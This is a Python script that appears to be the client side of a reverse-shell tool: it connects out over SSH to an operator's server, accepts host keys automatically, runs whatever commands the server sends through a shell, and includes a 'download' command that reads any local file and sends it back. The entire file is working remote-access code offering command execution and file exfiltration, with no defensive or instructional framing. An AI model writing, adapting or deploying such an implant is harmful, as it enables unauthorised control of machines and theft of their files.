#!/usr/bin/env python3
import paramiko
import subprocess
import time
import os
import sys
import traceback


def start_client(server_ip, server_port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(server_ip, port=server_port, username=username, password=password)
    except Exception as e:
        print("[-] Connection failed:", e)
        sys.exit(1)

    chan = client.get_transport().open_session()
    # Removed the initial greeting from the client:
    print("Client Connected!\n")

    current_dir = os.getcwd()

    try:
        while True:
            if chan.recv_ready():
                command = chan.recv(4096).decode().strip()
                if not command:
                    continue

                if command.lower() == "exit":
                    print("[-] Exit command received. Closing connection.")
                    break

                # Handle built-in commands:
                if command.startswith("cd "):
                    try:
                        path = command[3:].strip()
                        os.chdir(path)
                        current_dir = os.getcwd()
                        output = f"Changed directory to {current_dir}\n".encode()
                    except Exception as e:
                        output = f"Failed to change directory: {e}\n".encode()
                elif command.startswith("download "):
                    filename = command.split(" ", 1)[1].strip()
                    try:
                        with open(filename, "rb") as f:
                            file_data = f.read()
                        output = b"FILE_DOWNLOAD_START\n" + file_data + b"\nFILE_DOWNLOAD_END\n"
                    except Exception as e:
                        output = f"Failed to download file: {e}\n".encode()
                else:
                    try:
                        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    except subprocess.CalledProcessError as e:
                        output = e.output
                    except Exception as e:
                        output = f"Failed to execute command: {e}\n".encode()

                if not output:
                    output = b"Command executed.\n"
                chan.send(output)
            time.sleep(1)
    except KeyboardInterrupt:
        print("[-] KeyboardInterrupt detected. Exiting.")
    except Exception as e:
        print("[-] Exception:", e)
        traceback.print_exc()
    finally:
        chan.close()
        client.close()


if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python3 client.py <server_ip> <server_port> <username> <password>")
        sys.exit(1)
    server_ip = sys.argv[1]
    server_port = int(sys.argv[2])
    username = sys.argv[3]
    password = sys.argv[4]
    start_client(server_ip, server_port, username, password)
